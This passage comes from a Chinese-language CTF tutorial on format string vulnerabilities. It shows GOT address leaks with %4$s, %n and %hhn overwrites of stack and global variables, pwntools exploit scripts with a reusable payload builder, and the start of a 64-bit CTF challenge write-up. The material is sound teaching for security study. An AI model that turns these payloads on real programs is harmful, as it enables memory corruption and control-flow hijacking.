0xffffd440 → &quot;%4$s&quot;,</span><br><span class="line">   [sp + 0x8] &#x3D; 0xffffd440 → &quot;%4$s&quot;</span><br><span class="line">)</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;leakmemory&quot;, stopped 0xf7e4e030 in printf (), reason: BREAKPOINT</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0xf7e4e030 → printf()</span><br><span class="line">[#1] 0x80484ce → main()</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  help x&#x2F;</span><br><span class="line">Examine memory: x&#x2F;FMT ADDRESS.</span><br><span class="line">ADDRESS is an expression for the memory address to examine.</span><br><span class="line">FMT is a repeat count followed by a format letter and a size letter.</span><br><span class="line">Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),</span><br><span class="line">  t(binary), f(float), a(address), i(instruction), c(char), s(string)</span><br><span class="line">  and z(hex, zero padded on the left).</span><br><span class="line">Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).</span><br><span class="line">The specified number of objects of the specified size are printed</span><br><span class="line">according to the format.</span><br><span class="line"></span><br><span class="line">Defaults for format and size letters are those previously used.</span><br><span class="line">Default count is 1.  Default address is following last thing printed</span><br><span class="line">with this command or &quot;print&quot;.</span><br><span class="line">gef➤  x&#x2F;x 0xffffd440</span><br><span class="line">0xffffd440:0x73243425</span><br><span class="line">gef➤  vmmap</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-- &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rw- &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br><span class="line">0x0804b000 0x0806c000 0x00000000 rw- [heap]</span><br><span class="line">0xf7e04000 0xf7e05000 0x00000000 rw-</span><br><span class="line">0xf7e05000 0xf7fb2000 0x00000000 r-x &#x2F;lib32&#x2F;libc-2.23.so</span><br><span class="line">0xf7fb2000 0xf7fb3000 0x001ad000 --- &#x2F;lib32&#x2F;libc-2.23.so</span><br><span class="line">0xf7fb3000 0xf7fb5000 0x001ad000 r-- &#x2F;lib32&#x2F;libc-2.23.so</span><br><span class="line">0xf7fb5000 0xf7fb6000 0x001af000 rw- &#x2F;lib32&#x2F;libc-2.23.so</span><br><span class="line">0xf7fb6000 0xf7fb9000 0x00000000 rw-</span><br><span class="line">0xf7fd3000 0xf7fd4000 0x00000000 rw-</span><br><span class="line">0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 0x00000000 r-x &#x2F;lib32&#x2F;ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 0x00022000 r-- &#x2F;lib32&#x2F;ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 0x00023000 rw- &#x2F;lib32&#x2F;ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rw- [stack]</span><br><span class="line">gef➤  x&#x2F;x 0x73243425</span><br><span class="line">0x73243425:Cannot access memory at address 0x73243425</span><br></pre></td></tr></table></figure><p>显然 0xffffcd20 处所对应的格式化字符串所对应的变量值 0x73243425 并不能够被改程序访问，所以程序就自然崩溃了。</p><p>那么如果我们设置一个可访问的地址呢？比如说 scanf@got，结果会怎么样呢？应该自然是输出 scanf 对应的地址了。我们不妨来试一下。</p><p>首先，获取 scanf@got 的地址，如下</p><blockquote><p>这里之所以没有使用 printf 函数，是因为 scanf 函数会对 0a，0b，0c，00 等字符有一些奇怪的处理，，导致无法正常读入，，感兴趣的可以试试。。。。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RelRO | GOT functions: 3</span><br><span class="line"></span><br><span class="line">[0x804a00c] printf@GLIBC_2.0  →  0xf7e4e030</span><br><span class="line">[0x804a010] __libc_start_main@GLIBC_2.0  →  0xf7e1d550</span><br><span class="line">[0x804a014] __isoc99_scanf@GLIBC_2.7  →  0xf7e605c0</span><br></pre></td></tr></table></figure><p>下面我们利用 pwntools 构造 payload 如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;leakmemory&#39;)</span><br><span class="line">leakmemory &#x3D; ELF(&#39;.&#x2F;leakmemory&#39;)</span><br><span class="line">__isoc99_scanf_got &#x3D; leakmemory.got[&#39;__isoc99_scanf&#39;]</span><br><span class="line">print hex(__isoc99_scanf_got)</span><br><span class="line">payload &#x3D; p32(__isoc99_scanf_got) + &#39;%4$s&#39;</span><br><span class="line">print payload</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&#39;%4$s\n&#39;)</span><br><span class="line">print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@got</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>其中，我们使用 gdb.attach(sh) 来进行调试。当我们运行到第二个 printf 函数的时候 (记得下断点)，可以看到我们的第四个参数确实指向我们的 scanf 的地址，这里输出</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> → 0xf7615670 &lt;printf+0&gt;       call   0xf76ebb09 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   ↳  0xf76ebb09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf76ebb0c &lt;__x86.get_pc_thunk.ax+3&gt; ret</span><br><span class="line">      0xf76ebb0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf76ebb10 &lt;__x86.get_pc_thunk.dx+3&gt; ret</span><br><span class="line">───────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffbbf8dc&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffbbf8dc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp</span><br><span class="line">0xffbbf8e0│+0x04: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp</span><br><span class="line">0xffbbf8e4│+0x08: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp</span><br><span class="line">0xffbbf8e8│+0x0c: 0x000000c2</span><br><span class="line">0xffbbf8ec│+0x10: 0xf765c6bb  →  &lt;handle_intel+107&gt; add esp, 0x10</span><br><span class="line">0xffbbf8f0│+0x14: 0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp  ← $eax</span><br><span class="line">0xffbbf8f4│+0x18: &quot;%4$s&quot;</span><br><span class="line">0xffbbf8f8│+0x1c: 0x00000000</span><br></pre></td></tr></table></figure><p>同时，在我们运行的 terminal 下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python leakmemory.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;leakmemory&#39;: pid 15368</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">0x804a014</span><br><span class="line">\x14\x04%4$s</span><br><span class="line">[*] running in new terminal: &#x2F;usr&#x2F;bin&#x2F;gdb -q  &quot;.&#x2F;leakmemory&quot; 15368</span><br><span class="line">[-] Waiting for debugger: debugger exited! (maybe check &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope)</span><br><span class="line">0xf7df85c0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#39;.&#x2F;leakmemory&#39; stopped with exit code 0 (pid 15368)</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure><p>我们确实得到了 scanf 的地址。</p><p>但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[padding][addr]</span><br></pre></td></tr></table></figure><p>注意</p><blockquote><p>我们不能直接在命令行输入 \ x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 ,x,0,c 分别作为一个字符进行读入。下面就是错误的例子。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10   ← $esp</span><br><span class="line">0xffffcd00│+0x04: 0xffffcd10  →  &quot;\x0c\xa0\x04\x08%4$s&quot;</span><br><span class="line">0xffffcd04│+0x08: 0xffffcd10  →  &quot;\x0c\xa0\x04\x08%4$s&quot;</span><br><span class="line">0xffffcd08│+0x0c: 0x000000c2</span><br><span class="line">0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10</span><br><span class="line">0xffffcd10│+0x14: &quot;\x0c\xa0\x04\x08%4$s&quot;   ← $eax</span><br><span class="line">0xffffcd14│+0x18: &quot;\xa0\x04\x08%4$s&quot;</span><br><span class="line">0xffffcd18│+0x1c: &quot;\x04\x08%4$s&quot;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0xf7e44670 → Name: __printf(format&#x3D;0xffffcd10 &quot;\\x0c\\xa0\\x04\\x08%4$s&quot;)</span><br><span class="line">[#1] 0x80484ce → Name: main()</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x&#x2F;x 0xffffcd10</span><br><span class="line">0xffffcd10:   0x6330785c</span><br></pre></td></tr></table></figure></blockquote><h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</span><br></pre></td></tr></table></figure><p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。</p><p>这里我们给出如下的程序来介绍相应的部分。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* example&#x2F;overflow&#x2F;overflow.c *&#x2F;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int a &#x3D; 123, b &#x3D; 456;</span><br><span class="line">int main() &#123;</span><br><span class="line">  int c &#x3D; 789;</span><br><span class="line">  char s[100];</span><br><span class="line">  printf(&quot;%p\n&quot;, &amp;c);</span><br><span class="line">  scanf(&quot;%s&quot;, s);</span><br><span class="line">  printf(s);</span><br><span class="line">  if (c &#x3D;&#x3D; 16) &#123;</span><br><span class="line">    puts(&quot;modified c.&quot;);</span><br><span class="line">  &#125; else if (a &#x3D;&#x3D; 2) &#123;</span><br><span class="line">    puts(&quot;modified a for a small number.&quot;);</span><br><span class="line">  &#125; else if (b &#x3D;&#x3D; 0x12345678) &#123;</span><br><span class="line">    puts(&quot;modified b for a big number!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makefile 在对应的文件夹中。而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...[overwrite addr]....%[overwrite offset]$n</span><br></pre></td></tr></table></figure><p>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h2 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h2><h3 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h3><p>首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p><h3 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h3><p>其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p><p>其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret</span><br><span class="line">      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffcd0c&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcd0c│+0x00: 0x080484d7  →  &lt;main+76&gt; add esp, 0x10     ← $esp</span><br><span class="line">0xffffcd10│+0x04: 0xffffcd28  →  &quot;%d%d&quot;</span><br><span class="line">0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315</span><br><span class="line">0xffffcd18│+0x0c: 0x000000c2</span><br><span class="line">0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10</span><br><span class="line">0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000</span><br><span class="line">0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  &quot;XDG_SEAT_PATH&#x3D;&#x2F;org&#x2F;freedesktop&#x2F;DisplayManager&#x2F;Seat[...]&quot;</span><br><span class="line">0xffffcd28│+0x1c: &quot;%d%d&quot;     ← $eax</span><br></pre></td></tr></table></figure><p>我们可以发现在 0xffffcd14 处存储着变量 c 的数值。继而，我们再确定格式化字符串’%d%d’的地址 0xffffcd28 相对于 printf 函数的格式化字符串参数 0xffffcd10 的偏移为 0x18，即格式化字符串相当于 printf 函数的第 7 个参数，相当于格式化字符串的第 6 个参数。</p><h3 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h3><p>这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[addr of c]%012d%6$n</span><br></pre></td></tr></table></figure><p>addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p><p>具体脚本如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def forc():</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;overwrite&#39;)</span><br><span class="line">    c_addr &#x3D; int(sh.recvuntil(&#39;\n&#39;, drop&#x3D;True), 16)</span><br><span class="line">    print hex(c_addr)</span><br><span class="line">    payload &#x3D; p32(c_addr) + &#39;%012d&#39; + &#39;%6$n&#39;</span><br><span class="line">    print payload</span><br><span class="line">    #gdb.attach(sh)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    print sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">forc()</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  overwrite git:(master) ✗ python exploit.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;overwrite&#39;: pid 74806</span><br><span class="line">0xfffd8cdc</span><br><span class="line">܌��%012d%6$n</span><br><span class="line">܌��-00000160648modified c.</span><br></pre></td></tr></table></figure><h2 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h2><h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3><p>首先，我们来考虑一下如何修改 data 段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。</p><blockquote><p>或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。</p></blockquote><p>那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aa%k$nxx</span><br></pre></td></tr></table></figure><p>此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8，其实就可以覆盖了。</p><p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0804A024                 public a</span><br><span class="line">.data:0804A024 a               dd 7Bh</span><br></pre></td></tr></table></figure><p>故而我们可以构造如下的利用代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def fora():</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;overwrite&#39;)</span><br><span class="line">    a_addr &#x3D; 0x0804A024</span><br><span class="line">    payload &#x3D; &#39;aa%8$naa&#39; + p32(a_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    print sh.recv()</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure><p>对应的结果如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  overwrite git:(master) ✗ python exploit.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;overwrite&#39;: pid 76508</span><br><span class="line">[*] Process &#39;.&#x2F;overwrite&#39; stopped with exit code 0 (pid 76508)</span><br><span class="line">0xffc1729c</span><br><span class="line">aaaa$\xa0\x0modified a for a small number.</span><br></pre></td></tr></table></figure><p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p><h3 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h3><p>上面介绍了覆盖小数字，这里我们就少覆盖大数字了。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。</p><p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。</span><br><span class="line">h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。</span><br></pre></td></tr></table></figure><p>所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。这里，我们以单字节为例。</p><p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0804A028                 public b</span><br><span class="line">.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r</span><br></pre></td></tr></table></figure><p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0804A028 \x78</span><br><span class="line">0x0804A029 \x56</span><br><span class="line">0x0804A02a \x34</span><br><span class="line">0x0804A02b \x12</span><br></pre></td></tr></table></figure><p>首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#39;%6$n&#39;+pad2+&#39;%7$n&#39;+pad3+&#39;%8$n&#39;+pad4+&#39;%9$n&#39;</span><br></pre></td></tr></table></figure><p>我们可以依次进行计算。这里给出一个基本的构造，如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def fmt(prev, word, index):</span><br><span class="line">    if prev &lt; word:</span><br><span class="line">        result &#x3D; word - prev</span><br><span class="line">        fmtstr &#x3D; &quot;%&quot; + str(result) + &quot;c&quot;</span><br><span class="line">    elif prev &#x3D;&#x3D; word:</span><br><span class="line">        result &#x3D; 0</span><br><span class="line">    else:</span><br><span class="line">        result &#x3D; 256 + word - prev</span><br><span class="line">        fmtstr &#x3D; &quot;%&quot; + str(result) + &quot;c&quot;</span><br><span class="line">    fmtstr +&#x3D; &quot;%&quot; + str(index) + &quot;$hhn&quot;</span><br><span class="line">    return fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fmt_str(offset, size, addr, target):</span><br><span class="line">    payload &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(4):</span><br><span class="line">        if size &#x3D;&#x3D; 4:</span><br><span class="line">            payload +&#x3D; p32(addr + i)</span><br><span class="line">        else:</span><br><span class="line">            payload +&#x3D; p64(addr + i)</span><br><span class="line">    prev &#x3D; len(payload)</span><br><span class="line">    for i in range(4):</span><br><span class="line">        payload +&#x3D; fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)</span><br><span class="line">        prev &#x3D; (target &gt;&gt; i * 8) &amp; 0xff</span><br><span class="line">    return payload</span><br><span class="line">payload &#x3D; fmt_str(6,4,0x0804A028,0x12345678)</span><br></pre></td></tr></table></figure><p>其中每个参数的含义基本如下</p><ul><li>offset 表示要覆盖的地址最初的偏移</li><li>size 表示机器字长</li><li>addr 表示将要覆盖的地址。</li><li>target 表示我们要覆盖为的目的变量值。</li></ul><p>相应的 exploit 如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def forb():</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;overwrite&#39;)</span><br><span class="line">    payload &#x3D; fmt_str(6, 4, 0x0804A028, 0x12345678)</span><br><span class="line">    print payload</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    print sh.recv()</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  overwrite git:(master) ✗ python exploit.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;overwrite&#39;: pid 78547</span><br><span class="line">(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn</span><br><span class="line">[*] Process &#39;.&#x2F;overwrite&#39; stopped with exit code 0 (pid 78547)</span><br><span class="line">0xfff6f9bc</span><br><span class="line">(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0  </span><br></pre></td></tr></table></figure><p>当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p><h1 id="格式化字符串漏洞例子"><a href="#格式化字符串漏洞例子" class="headerlink" title="格式化字符串漏洞例子"></a>格式化字符串漏洞例子</h1><p>下面会介绍一些 CTF 中的格式化漏洞的题目。也都是格式化字符串常见的利用。</p><h2 id="64-位程序格式化字符串漏洞"><a href="#64-位程序格式化字符串漏洞" class="headerlink" title="64 位程序格式化字符串漏洞"></a>64 位程序格式化字符串漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote><p>其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p></blockquote><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这里，我们以 2017 年的 UIUCTF 中 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a> 为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个 flag.txt 文件。</p><h4 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec goodluck       </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出程序开启了 NX 保护以及部分 RELRO 保护</p><h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>可以发现，程序的漏洞很明显</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ( j &#x3D; 0; j &lt;&#x3D; 21; ++j )</span><br><span class="line"> &#123;</span><br><span class="line">   v5 &#x3D; format[j];</span><br><span class="line">   if ( !v5 || v11[j] !&#x3D; v5 )</span><br><span class="line">   &#123;</span><br><span class="line">     puts(&quot;You answered:&quot;);</span><br><span class="line">     printf(format);</span><br><span class="line">     puts(&quot;\nBut that was totally wrong lol get rekt&quot;);</span><br><span class="line">     fflush(_bss_start);</span><br><span class="line">     result &#x3D; 0;</span><br><span class="line">     goto LABEL_11;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><p>我们在 printf 处下偏移如下, 这里只关注代码部分与栈部分。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x400640</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: &#x2F;mnt&#x2F;hgfs&#x2F;Hack&#x2F;ctf&#x2F;ctf-wiki&#x2F;pwn&#x2F;fmtstr&#x2F;example&#x2F;2017-UIUCTF-pwn200-GoodLuck&#x2F;goodluck </span><br><span class="line">what&#39;s the flag</span><br><span class="line">123456</span><br><span class="line">You answered:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, __printf (format&#x3D;0x602830 &quot;123456&quot;) at printf.c:28</span><br><span class="line">28  printf.c: 没有那个文件或目录.</span><br><span class="line"></span><br><span class="line">─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span><br><span class="line">   0x7ffff7a627f7 &lt;fprintf+135&gt;    add    rsp, 0xd8</span><br><span class="line">   0x7ffff7a627fe &lt;fprintf+142&gt;    ret    </span><br><span class="line">   0x7ffff7a627ff                  nop    </span><br><span class="line"> → 0x7ffff7a62800 &lt;printf+0&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7a62807 &lt;printf+7&gt;       test   al, al</span><br><span class="line">   0x7ffff7a62809 &lt;printf+9&gt;       mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7a6280e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0x7fffffffdb08&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0x00007fffffffdb08│+0x00: 0x0000000000400890  →  &lt;main+234&gt; mov edi, 0x4009b8    ← 